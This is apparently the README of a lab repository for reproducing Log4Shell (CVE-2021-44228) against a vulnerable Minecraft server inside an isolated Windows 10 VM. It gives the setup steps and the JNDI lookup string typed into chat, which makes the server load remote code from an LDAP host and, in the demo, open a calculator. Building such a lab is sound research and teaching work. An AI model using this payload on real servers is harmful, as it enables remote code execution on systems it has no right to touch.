# Log4Shell Minecraft Server Lab

This repository contains a lab environment to reproduce and analyze the Log4Shell (CVE-2021-44228) vulnerability on a Minecraft server running inside a Windows 10 virtual machine.

## Prerequisites

Ensure you have the following installed on your host system:

- QEMU and KVM for virtualization
- genisoimage to build the installer ISO
- curl to download resources
- Maven and JDK to compile the exploit payloads
- A Windows 10 installation ISO (placed in the root directory as `Windows 10 Build 14393.iso`)

### Installation

Run the script to fetch the vulnerable Minecraft server and OpenJDK ZIP for Windows:

```bash
./scripts/download_resources.sh
```

Run the script to compile the staging files and build the installer ISO:

```bash
./scripts/build_installer_iso.sh
```

Or for Windows, run:

```powershell
powershell -File scripts\build_installer_iso.ps1
```

This builds `minecraft_installer.iso`, which contains a setup script configured to disable online mode verification and launch the server with vulnerable JNDI codebase lookup properties enabled.

Now, you can start the Windows 10 VM inside QEMU:

```bash
./scripts/run_vm.sh
```

Or you could simply use VMware or VirtualBox. In VM Settings -> Network Adapter, select Host-only so Windows Update never fires. Then, attach `minecraft_installer.iso` as the VM's CD/DVD image.

### Build and Run Exploit

Compile the exploit package using Maven in the `exploit` folder:

```bash
cd exploit
mvn clean package -DskipTests
```

Setup something like this:

![Set up](./docs/setup.png)

Trigger the exploit by entering the JNDI lookup string into the Minecraft chat:

```text
${jndi:ldap://<host-ip>:<ldap-port>/Exploit} // For me it's ${jndi:ldap://10.0.2.2:1389/Exploit}
```

Then you will see a calculator pop up!

![Calculator!](./docs/calculator.png)
